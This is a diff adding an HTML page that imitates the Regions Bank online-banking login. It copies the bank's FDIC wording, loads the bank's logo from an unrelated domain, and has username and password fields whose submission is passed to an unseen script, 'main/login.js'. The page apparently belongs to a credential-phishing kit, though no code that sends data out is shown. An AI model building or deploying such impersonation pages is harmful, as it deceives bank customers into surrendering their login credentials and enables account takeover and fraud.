@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Regions Bank Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      color: #1a1a1a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      height: 50px;
+    }
+
+    .fdic-text {
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    .heading {
+      font-size: 3rem;
+      font-weight: 300;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .subheading {
+      font-size: 1.3rem;
+      text-align: center;
+      font-weight: 600;
+      margin-bottom: 30px;
+    }
+
+    .login-box {
+      background: #fff;
+      border-radius: 20px;
+      padding: 30px 25px;
+      box-shadow: 0 0 9px rgba(0, 0, 0, 0.08);
+      width: 100%;
+      max-width: 550px;
+    }
+
+    .login-box label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      border: 1.3px solid #f7f5f5;
+      border-radius: 8px;
+      font-size: 1.2rem;
+      margin-bottom: 15px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .checkbox-container input {
+      margin-right: 8px;
+    }
+
+    .checkbox-container label {
+      font-weight: normal;
+    }
+
+    /* Center the button */
+    .button-container {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .login-box button {
+      width: 70%;
+      padding: 14px;
+      background-color: #3d6f1b;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 25px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+      display: block;
+    }
+
+    .login-box button:hover {
+      background-color: #345f17;
+    }
+
+    .links {
+      text-align: center;
+      margin-top: 25px;
+      font-size: 14px;
+    }
+
+    .links a {
+      color: #007f7f;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .heading {
+        font-size: 24px;
+      }
+
+      .subheading {
+        font-size: 14px;
+      }
+
+      .login-box {
+        padding: 25px 20px;
+      }
+
+      .login-box button {
+        width: 80%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://thebanks.eu/img/logos/Regions_Bank.png" alt="Regions Bank Logo" />
+  </div>
+
+  <div class="fdic-text">
+    <strong>FDIC</strong> FDIC-Insured – Backed by the full faith and credit of the U.S. Government
+  </div>
+
+  <div class="heading">Access your accounts online</div>
+  <div class="subheading">Log in to Online Banking</div>
+
+  <div class="login-box">
+    <form id="loginForm">
+      <label for="username">Username</label>
+      <input type="text" id="loginId" name="username" placeholder="Enter your username" />
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" />
+
+      <div class="checkbox-container">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Remember my username</label>
+      </div>
+
+      <!-- Centered button container -->
+      <div class="button-container">
+        <button type="submit">Continue</button>
+      </div>
+    </form>
+  </div>
+
+  <div class="links">
+    <p>Forgot <a href="#">username</a> or <a href="#">password</a>?</p>
+    <p>Don’t have an Online Banking account? <a href="#">Enroll now.</a></p>
+  </div>
+ <script src="main/login.js"></script>
+</body>
+</html>
